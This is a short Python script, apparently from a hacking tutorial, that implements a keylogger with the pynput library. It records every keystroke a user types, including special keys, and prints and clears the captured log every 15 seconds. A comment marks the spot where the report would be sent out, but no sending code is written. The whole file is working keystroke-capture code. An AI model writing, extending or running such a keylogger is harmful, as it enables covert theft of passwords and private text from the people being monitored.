#!/usr/bin/env python

import threading
from pynput import keyboard



class Keylogger:
    def __init__(self):
        self.log = ""

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.backspace:
                self.log = self.log[:-1]
            else:
                self.log = self.log + "  " + str(key) + "  "  # takes special keys

    def report(self):
        print(self.log)
        data = self.log  # send report here
        self.log = ""
        timer = threading.Timer(15, self.report)  # calls itself with a time interval
        timer.start()


    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()  # starts listener

keylog = Keylogger()
keylog.start()